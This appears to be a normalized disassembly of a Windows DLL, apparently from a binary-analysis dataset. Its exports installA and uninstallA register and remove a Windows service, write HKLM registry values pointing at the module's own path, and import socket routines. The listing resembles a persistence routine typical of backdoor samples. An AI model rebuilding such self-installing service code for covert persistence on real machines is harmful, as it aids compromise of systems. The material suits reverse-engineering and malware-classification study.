jl r-xdata
or eax 0xffffffff
jmp r-xdata
je r-xdata
pop edi
pop esi
retn
mov eax edi
sub eax esi
jmp r-xdata
add [ esp + 0x10 ] eax
sub esi eax
test esi esi
jg r-xdata
InstallService
mov eax sub_10002a10
call sub_10002890
sub esp 0x298
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
push edi
cmp eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] 0x80000002
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] rw-data
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x14 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
cmp [ eax ] bl
je r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea eax [ ebp - 0x2c ]
mov edi 0x258
push eax
lea eax [ ebp - 0x2a4 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push ebx
push rw-data
mov [ ebp - 0x2c ] edi
push [ ebp - 0x14 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
call [ RegCloseKey@IAT ]
push [ ebp + 0x8 ]
call [ SetLastError@IAT ]
cmp [ ebp + 0x8 ] ebx
je r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] rw-data
call _CxxThrowException
mov [ ebp - 0x1c ] eax
lea esi [ ebp - 0x2a4 ]
lea eax [ ebp - 0x40 ]
push r--data
push eax
mov [ ebp - 0x40 ] rw-data
call _CxxThrowException
push rw-data
call [ OutputDebugStringA@IAT ]
cmp [ ebp - 0x2a4 ] 0x0
je r-xdata
push [ ebp - 0x1c ]
push esi
call [ _stricmp@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x28 ] esi
jne r-xdata
lea eax [ ebp - 0x3c ]
push r--data
push eax
mov [ ebp - 0x3c ] rw-data
call _CxxThrowException
cmp [ esi ] 0x0
jne r-xdata
push ebx
push esi
call [ strchr@IAT ]
pop ecx
inc eax
pop ecx
mov esi eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
push 0x1
push 0x2
push 0x20
push 0xf01ff
push rw-data
push [ ebp - 0x1c ]
push esi
call [ CreateServiceA@IAT ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
jne r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
mov [ ebp - 0x44 ] rw-data
call _CxxThrowException
cmp [ esi ] 0x0
je r-xdata
mov ebx [ CloseServiceHandle@IAT ]
push eax
call ebx
push esi
call ebx
mov ebx [ strncpy@IAT ]
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
mov esi [ strncat@IAT ]
push 0x64
push [ ebp - 0x1c ]
lea eax [ ebp - 0x2a4 ]
push eax
call esi
add esp 0x18
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x80000002
call [ RegCreateKeyA@IAT ]
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
push 0x64
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x2a4 ]
push eax
call strlen
add esp 0x1c
inc eax
mov esi [ RegSetValueExA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x2
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x2a4 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x2a4 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x18 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push [ ebp - 0x14 ]
mov [ ebp - 0x18 ] 0x1
call esi
push edi
lea eax [ ebp - 0x2a4 ]
push rw-data
push eax
call ebx
add esp 0xc
lea eax [ ebp - 0x2a4 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x1
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
push 0x4
lea eax [ ebp - 0x18 ]
pop ebx
mov [ ebp - 0x18 ] 0x2
push ebx
push eax
push ebx
push 0x0
push rw-data
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x18 ]
push ebx
push eax
push ebx
xor ebx ebx
mov [ ebp - 0x18 ] 0x20
push ebx
push rw-data
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x20 ]
push eax
push rw-data
push [ ebp - 0x14 ]
call [ RegCreateKeyA@IAT ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x2a4 ]
push edi
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push rw-data
call [ OutputDebugStringA@IAT ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
mov [ ebp - 0x30 ] rw-data
call _CxxThrowException
lea eax [ ebp - 0x2a4 ]
push eax
call strlen
pop ecx
inc eax
push eax
lea eax [ ebp - 0x2a4 ]
push eax
push 0x2
push ebx
push rw-data
push [ ebp - 0x20 ]
call esi
mov edi rw-data
push edi
call strlen
inc eax
pop ecx
inc eax
push eax
push edi
push 0x7
push ebx
push rw-data
push [ ebp - 0x14 ]
call esi
mov [ ebp + 0x8 ] eax
push [ ebp - 0x14 ]
mov esi [ RegCloseKey@IAT ]
call esi
push [ ebp - 0x20 ]
call esi
push [ ebp - 0x24 ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push [ ebp - 0x28 ]
call esi
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x38 ]
push r--data
push eax
mov [ ebp - 0x38 ] rw-data
call _CxxThrowException
UninstallService
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
push rw-data
mov esi [ OutputDebugStringA@IAT ]
call esi
mov [ ebp - 0x4 ] ebx
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x21c ] rw-data
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push 0x10000
push [ ebp - 0x21c ]
push [ ebp - 0x24 ]
call [ OpenServiceA@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
push eax
call [ DeleteService@IAT ]
test eax eax
jne r-xdata
push rw-data
jmp r-xdata
mov [ ebp - 0x21c ] eax
push 0x1f4
push rw-data
lea eax [ ebp - 0x218 ]
push eax
call [ strncpy@IAT ]
push 0x64
push [ ebp - 0x21c ]
lea eax [ ebp - 0x218 ]
push eax
call [ strncat@IAT ]
add esp 0x18
push rw-data
push rw-data
jmp r-xdata
call esi
sub_10002751
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
mov [ rw-data ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x20
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x14 ] 0x7
push [ rw-data ]
mov [ ebp - 0x4 ] 0xbb8
call [ SetServiceStatus@IAT ]
leave
retn
sub_10002799
mov eax [ esp + 0x4 ]
push esi
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x3
call sub_10002751
add esp 0xc
push 0xa
call [ Sleep@IAT ]
dec eax
je r-xdata
xor esi esi
push 0x1
push esi
push 0x6
call sub_10002751
push esi
push esi
push 0x7
jmp r-xdata
dec eax
je r-xdata
call sub_10002751
add esp 0x18
jmp r-xdata
xor esi esi
push 0x1
push esi
push 0x5
call sub_10002751
push esi
push esi
push 0x4
dec eax
je r-xdata
pop esi
retn 0x4
xor esi esi
push esi
push esi
push [ rw-data ]
jmp r-xdata
dec eax
jne r-xdata
call sub_10002751
add esp 0xc
xor esi esi
jmp r-xdata
push esi
push esi
push 0x1
sub_10002830
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_100028bc
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_100028bc
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001000
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_100028bc
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_100028bc
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
installA
push [ esp + 0xc ]
call InstallService
pop ecx
retn 0x10
sub_10002717
push 0x1
pop eax
retn
uninstallA
push [ esp + 0xc ]
call UninstallService
pop ecx
retn 0x10
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
memset
jmp [ memset@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
sub_1000286c
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_10002890
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_10002a10
mov eax r--data
jmp __CxxFrameHandler
